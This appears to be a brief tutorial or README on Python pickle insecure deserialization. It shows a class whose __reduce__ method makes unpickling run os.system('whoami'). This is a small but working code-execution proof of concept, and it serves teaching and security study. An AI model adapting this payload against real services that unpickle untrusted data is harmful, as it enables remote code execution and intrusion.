# Pickle Deserialization RCE
## This is how this script simulates a possible Insecure Deserilization attack.

Firstly, pickle is a python module for serializing and deserializing Python objects. Secondly, base64 is used to encode hex in base64 because why not.

```
import pickle
import base64
```

This next piece of code defines a Class with the special method __reduce__(). __reduce__() is used by pickle to determine how an object should be serialized. It's a tuple where the first item is a function and the second is a tuple of arguments.

So this code unpickled will run os.system('whoami')

```
class VeryCoolClass:
    def __reduce__(self):
        import os
        return (
            os.system, ('whoami',)
        )
```

Afterwards, the class is serialized and then deserialized. When the object is deserialized, the __reduce__() function is triggered running arbitrary code.
